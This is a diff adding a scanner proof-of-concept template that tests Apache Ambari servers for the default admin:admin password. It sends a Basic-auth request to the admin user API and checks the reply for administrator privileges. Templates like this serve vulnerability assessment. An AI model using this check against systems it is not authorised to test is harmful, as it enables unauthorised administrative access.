@@ -1,0 +1,18 @@
+detail:
+  author: wulalalaaa(https://github.com/wulalalaaa)
+  links:
+  - https://cwiki.apache.org/confluence/display/AMBARI/Quick+Start+Guide
+expression: r0()
+manual: true
+name: poc-yaml-apache-ambari-default-password
+rules:
+  r0:
+    expression: response.status == 200 && response.body.bcontains(b"PrivilegeInfo")
+      && response.body.bcontains(b"AMBARI.ADMINISTRATOR")
+    request:
+      cache: true
+      headers:
+        Authorization: Basic YWRtaW46YWRtaW4=
+      method: GET
+      path: /api/v1/users/admin?fields=*,privileges/PrivilegeInfo/cluster_name,privileges/PrivilegeInfo/permission_name
+transport: http
